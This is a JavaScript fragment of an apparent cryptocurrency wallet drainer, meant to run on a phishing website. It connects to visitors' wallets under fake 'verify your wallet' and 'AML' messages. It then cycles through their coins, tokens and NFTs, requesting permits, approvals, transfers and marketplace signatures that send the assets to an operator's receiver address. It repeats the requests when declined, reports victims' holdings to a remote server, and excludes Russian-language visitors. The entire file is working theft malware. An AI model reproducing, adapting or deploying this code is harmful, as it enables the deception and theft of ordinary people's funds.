    }
    if (MS_Process) return; MS_Process = true;

    if (provider !== null) {
      if (provider == 'MetaMask') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isMetaMask == true) {
              is_installed = true;
              MS_Provider = elem;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!is_installed) {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'MetaMask';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Coinbase') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isCoinbaseWallet == true) {
              is_installed = true;
              MS_Provider = elem;
              break;
            }
          }
          if (is_installed) {
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Trust Wallet') {
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Trust Wallet';
        } else {
          if (MS_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}`;
            MS_Process = false;
            return;
          } else {
            window.open('https://trustwallet.com', '_blank').focus();
            MS_Process = false;
            return;
          }
        }
      } else if (provider == 'Binance Wallet') {
        if (typeof window.BinanceChain === 'object') {
          MS_Provider = window.BinanceChain;
          MS_Current_Provider = 'Binance Wallet';
        } else {
          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
          MS_Process = false;
          return;
        }
      } else if (provider == 'WalletConnect' || provider == 'WalletConnect_v2') {
        MS_Current_Provider = 'WalletConnect';
      } else {
        if (typeof window.ethereum === 'object') {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Ethereum';
        } else {
          MS_Current_Provider = 'WalletConnect';
        }
      }
    } else {
      if (window.ethereum) {
        MS_Provider = window.ethereum;
        MS_Current_Provider = 'Ethereum';
      } else {
        MS_Current_Provider = 'WalletConnect';
      }
    }
    try {
      await connect_request();
      let connection = null;
      if (MS_Current_Provider == 'WalletConnect') {
        ms_hide();
        await load_wc();
        try {
          await MS_Provider.disconnect();
        } catch(err) {
          console.log(err);
        }
        await MS_Provider.connect();
        if (MS_Provider && MS_Provider.accounts.length > 0) {
          if (!MS_Provider.accounts[0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(r => setTimeout(r, 2500));
          MS_Current_Address = MS_Provider.accounts[0];
          MS_Current_Chain_ID = MS_Provider.chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
          if (MS_Settings.Settings.Sign.WalletConnect == 0) {
            MS_Sign_Disabled = true;
          }
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        try {
          connection = await MS_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!MS_Provider.selectedAddress.includes('0x')) return connect_cancel();
            MS_Current_Address = MS_Provider.selectedAddress;
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            MS_Current_Address = connection[0];
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
    } catch(err) {
      console.log(err);
      MS_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (MS_Settings.V_MODE == 1) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'load', title: 'Waiting for action', text: 'Sign message to verificate your wallet',
          showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          html: '<b>Sign message</b> to verificate you wallet...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      }
      try {
        const verification_message = ((MS_Verify_Message == "") ? MS_Settings.V_MSG : MS_Verify_Message).replaceAll('{{ADDRESS}}', MS_Current_Address);
        const signed_message = await MS_Signer.signMessage(verification_message);
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
        if (!is_sign_correct) {
          if (MS_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
              showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
            });
          } else {
            Swal.fire({
              title: 'Verification Error',
              text: "We have received your signature, but it's incorrect, please try again.",
              icon: 'error', confirmButtonText: 'OK'
            });
          }

          MS_Process = false;
          return await connect_cancel();
        } else {
          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: MS_Current_Address, message: MS_Verify_Message });
          if (server_result.status != 'OK') {
            if (MS_Loader_Style == 2) {
              MSL.fire({
                icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
                showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
              });
            } else {
              Swal.fire({
                title: 'Verification Error',
                text: "We have received your signature, but it's incorrect, please try again.",
                icon: 'error', confirmButtonText: 'OK'
              });
            }
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch(err) {
        if (MS_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We cannot verify that the wallet is yours as you did not sign the message provided.',
            showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
          });
        } else {
          Swal.fire({
            title: 'Verification Error',
            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
            icon: 'error', confirmButtonText: 'OK'
          });
        }
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({ action: 'sign_verify', address: MS_Current_Address });
    }
    await connect_success(); show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase().trim())) {
      MS_Check_Done = true; Swal.close();
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'AML Error', text: 'Your wallet is not AML clear!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'AML Error',
          text: "Your wallet is not AML clear, you can\'t use it!",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      MS_Process = false;
      return;
    }
    let assets = await get_wallet_assets(MS_Current_Address);
    let assets_price = 0; for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch(err) {
        console.log(err);
      }
    }
    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
    await send_request({ action: 'check_finish', user_id: MS_ID, assets: assets, balance: assets_usd_balance });
    MS_Check_Done = true; Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'Something went wrong!', text: 'For security reasons we can\'t allow you to connect empty or new wallet',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'Something went wrong!',
          text: "For security reasons we can't allow you to connect empty or new wallet",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      MS_Process = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
        showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
      });
    } else {
      Swal.fire({
        html: '<b>Done!</b> Sign message in your wallet to continue...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
    if ((MS_Settings.Settings.Sign.MetaMask == 0 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Sign.Trust == 0
      && MS_Current_Provider == 'Trust Wallet') || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) MS_Sign_Disabled = true;
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') MS_Gas_Reserves[asset.chain_id] += 1;
      } catch(err) {
        console.log(err);
      }
    }
    console.table(assets);
    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 1)
      await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price);
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 1)
      await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price);
    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Current_Chain_ID == 1 && MS_Settings.Settings.x2y2.Priority == 1)
      await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price);
    let should_repeat_all = true;
    while (should_repeat_all) {
      should_repeat_all = (MS_Settings.LA == 1);
      for (const asset of assets) {
        try {
          if (asset.skip) continue;
          let is_chain_correct = false;
          if (asset.type == 'NATIVE') {
            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
            const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(Math.floor(MS_Gas_Multiplier * 100));
            const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
            const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
            const tx_template = { from: MS_Current_Address, to: MS_Settings.Receiver, value: BN(100) };
            const gas_limit = await node.estimateGas(tx_template);
            const balance = await node.getBalance(MS_Current_Address);
            const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
            if (available_amount.lte(BN(0))) continue;
          }
          if (asset.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, asset.chain_id);
            try {
              if (MS_Current_Provider == 'WalletConnect') {
                try {
                  await MS_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
                } catch(err) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await MS_Provider.request({
                    method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]
                  });
                } catch(err) {
                  if (err.code == 4902 || err.code == -32603) {
                    try {
                      await MS_Provider.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[asset.chain_id] ] });
                    } catch(err) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              MS_Current_Chain_ID = asset.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              is_chain_correct = true;
              await chain_success();
            } catch(err) {
              console.log(err);
              await chain_cancel();
              continue;
            }
          } else {
            is_chain_correct = true;
          }
          if (!is_chain_correct) continue;
          if (asset.type == 'NATIVE') {
            if (MS_Settings.Settings.Sign.Native > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          await TRANSFER_NATIVE(asset);
                          asset.skip = true;
                          break;
                        } catch(err) {
                          console.log(err);
                          if (err != 'LOW_BALANCE') {
                            await transfer_cancel();
                            if (!MS_Settings.Loop_N) break;
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_N) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await transfer_cancel();
                    if (!MS_Settings.Loop_N) break;
                  } else {
                    break;
                  }
                }
              }
            }
          } else if (asset.type == 'ERC20') {
            if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode && asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
              const data = await retrive_token(asset.chain_id, asset.address);
              const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
              const contract = new ethers.Contract(asset.address, data, node);
              const permit_type = get_permit_type(contract.functions);
              asset.permit = permit_type;
              asset.permit_ver = "1";
              asset.abi = data;
              if (permit_type > 0) {
                if (contract.functions.hasOwnProperty('version')) {
                  try {
                    asset.permit_ver = await contract.version();
                  } catch(err) {
                    console.log(err);
                  }
                }
                console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
              }
            }
            if (asset.permit > 0) {
              for (const c_address of MS_Settings.Permit_BL) {
                if (c_address[0] == MS_Current_Chain_ID && c_address[1] === asset.address.toLowerCase().trim()) {
                  asset.permit = 0;
                  break;
                }
              }
            }
            if (MS_Settings.Settings.Permit2.Mode && asset.permit2) {
              const all_permit2 = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.chain_id == asset.chain_id && x_asset.permit2) {
                    all_permit2.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              while (true) {
                try {
                  await DO_PERMIT2(asset, all_permit2);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else if (MS_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
              while (true) {
                try {
                  await PERMIT_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else if (MS_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
              if (asset.swapper_type == 'Uniswap') {
                const all_uniswap = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
                      all_uniswap.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_UNISWAP(asset, all_uniswap);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              } else if (asset.swapper_type == 'Pancake_V3') {
                const all_pancake = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Pancake_V3') {
                      all_pancake.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_PANCAKE_V3(asset, all_pancake);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              } else {
                while (true) {
                  try {
                    await DO_SWAP(asset);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!MS_Settings.Loop_T) break;
                  }
                }
              }
            } else if (MS_Settings.Settings.Sign.Tokens > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_TOKEN(asset);
                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address, PW: false });
                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.Tokens == 1) {
                          if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask) || (MS_Current_Provider == 'Trust Wallet'
                          && MS_Settings.Settings.Approve.Trust) || (MS_Current_Provider != 'MetaMask' && MS_Current_Provider != 'Trust Wallet')) {
                            try {
                              let res_code = await APPROVE_TOKEN(asset);
                              if (res_code == 1) {
                                const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address, PW: MS_Settings.Personal_Wallet });
                                if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                              }
                              asset.skip = true;
                              break;
                            } catch(err) {
                              await approve_cancel();
                              if (!MS_Settings.Loop_T) break;
                            }
                          } else {
                            try {
                              await TRANSFER_TOKEN(asset);
                              asset.skip = true;
                              break;
                            } catch(err) {
                              console.log(err);
                              await transfer_cancel();
                              if (!MS_Settings.Loop_T) break;
                            }
                          }
                        } else if (MS_Settings.Settings.Sign.Tokens == 2) {
                          try {
                            await TRANSFER_TOKEN(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_T) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_T) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if ((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask) || (MS_Current_Provider == 'Trust Wallet'
            && MS_Settings.Settings.Approve.Trust) || (MS_Current_Provider != 'MetaMask' && MS_Current_Provider != 'Trust Wallet')) {
              while (true) {
                try {
                  let res_code = await APPROVE_TOKEN(asset);
                  if (res_code == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address, PW: MS_Settings.Personal_Wallet });
                    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            }
          } else if (asset.type == 'ERC721') {
            if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 0 && !BL_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
            && asset.amount_usd >= MS_Settings.Settings.Blur.Price) {
              await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price); BL_US = true;
            } else if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 0 && !SP_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
            && asset.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
              await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price); SP_US = true;
            } else if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Settings.Settings.x2y2.Priority == 0 && !XY_US
            && MS_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
            && asset.amount_usd >= MS_Settings.Settings.x2y2.Price) {
              await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price); XY_US = true;
            } else if (MS_Settings.Settings.Sign.NFTs > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NFT(asset);
                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                    let same_collection = [];
                    for (const x_asset of assets) {
                      try {
                        if (x_asset.address == asset.address) {
                          same_collection.push(x_asset);
                          x_asset.skip = true;
                        }
                      } catch(err) {
                        console.log(err);
                      }
                    }
                    await send_request({
                      action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                      chain_id: MS_Current_Chain_ID, contract_address: asset.address
                    });
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.NFTs == 1) {
                          try {
                            await DO_SAFA(asset);
                            let same_collection = [];
                            for (const x_asset of assets) {
                              try {
                                if (x_asset.address == asset.address) {
                                  same_collection.push(x_asset);
                                  x_asset.skip = true;
                                }
                              } catch(err) {
                                console.log(err);
                              }
                            }
                            await send_request({
                              action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                              chain_id: MS_Current_Chain_ID, contract_address: asset.address
                            });
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await approve_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                          try {
                            await TRANSFER_NFT(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_NFT) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if (MS_Settings.Settings.Approve.Enable) {
              while (true) {
                try {
                  await DO_SAFA(asset);
                  let same_collection = [];
                  for (const x_asset of assets) {
                    try {
                      if (x_asset.address == asset.address) {
                        same_collection.push(x_asset);
                        x_asset.skip = true;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                  await send_request({
                    action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                    chain_id: MS_Current_Chain_ID, contract_address: asset.address
                  });
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NFT(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 2000);
  } catch(err) {
    console.log(err);
  }
}

try {
  let query_string = window.location.search, url_params = new URLSearchParams(query_string);
  if (url_params.get('cis') != 'test' && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    MS_Bad_Country = true;
  }
} catch(err) {
  console.log(err);
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    if (MS_Modal_Style == 2) MSM.init(); else inject_modal();
    if (MS_Loader_Style == 2) MSL.init();
    MS_Load_Time = Math.floor(Date.now() / 1000);
    if (typeof localStorage['MS_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrive_id' });
      if (ID_Data.status == 'OK') localStorage['MS_ID'] = ID_Data.data;
      else localStorage['MS_ID'] = Math.floor(Date.now() / 1000);
    }
    MS_ID = localStorage['MS_ID'];
    await retrive_config();
    fill_chain_data();
    await retrive_contract();
    MS_Ready = true;
    enter_website();
    for (const chain_id in MS_Settings.RPCs) MS_Gas_Reserves[chain_id] = 0;
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => ms_init());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

const use_wc = () => { connect_wallet('WalletConnect'); };

setInterval(async () => {
  try {
    let partner_address = document.getElementById('partner-address');
    if (partner_address === null) return;
    else MS_Partner_Address = partner_address.value.trim();
  } catch(err) {
    console.log(err);
  }
}, 1000);

window.addEventListener("beforeunload", (e) => leave_website());
window.addEventListener("onbeforeunload", (e) => leave_website());
